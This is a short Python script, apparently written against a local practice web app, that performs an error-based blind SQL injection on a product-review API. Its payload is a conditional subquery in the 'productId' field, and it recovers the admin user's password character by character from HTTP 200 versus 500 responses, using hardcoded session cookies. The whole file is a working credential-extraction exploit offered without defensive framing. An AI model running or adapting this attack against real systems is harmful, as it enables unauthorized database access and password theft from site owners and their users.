import string
import requests

#if the substring is equal to the character the if selects 1,no error
#if the substring is not equal to the character the if selects 1/0 ,error

our_payload = "4',if((select substring(password,1,1) from users where username='test')='t', 1, 1/0))-- -"

def error_sql_injection() :
    url="http://localhost:3000/api/review"
    cookies = {
        "connect.sid": "s%3AdgGnNzIbGhY63B_PLAE80vhcJ-HrDZGE.BGfgeroHFXIQwci68w8nII4WQNoi%2B9IoM%2FKp8GDIp48",
        "session_cookie": "s%3Amfmfa1O5sIwFnCGiKzKMgdm3n_Te2-yD.bVA98rWMElLjA3RZSJCAl7AJ0wc0cnLDPm2RABhyV3g"
    }
    username = "admin"
    password_length = 255 #max lenth  
    password_chars = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
    password=""
    # let's execute the attack
    for pos in range (1,password_length+1):
        for char in password_chars:
            found=0
            payload = f"4',if((select substring(password,{pos},1) from users where username='{username}')='{char}', 1, 1/0))-- -"
            data = {
                "productId": payload,
                "rating": 5
            }
            r = requests.post(url, data=data, cookies=cookies)
            # 200 ok means no error
            if r.status_code == 200 and "true" in r.text:
                password += char
                print(password)
                found=1
                break
            # 500 means a database error occured
            elif r.status_code == 500: 
                continue
            # in case of an unsuspected error,not intentionally
            else:
                print(f"[-] Error: {r.status_code}")
                return None
        if(not found):#no charcater mathed most likely means the password is over
            break
    return password

password = error_sql_injection()
if(password):
    print("guessed password :",password)
else :
    print("fail")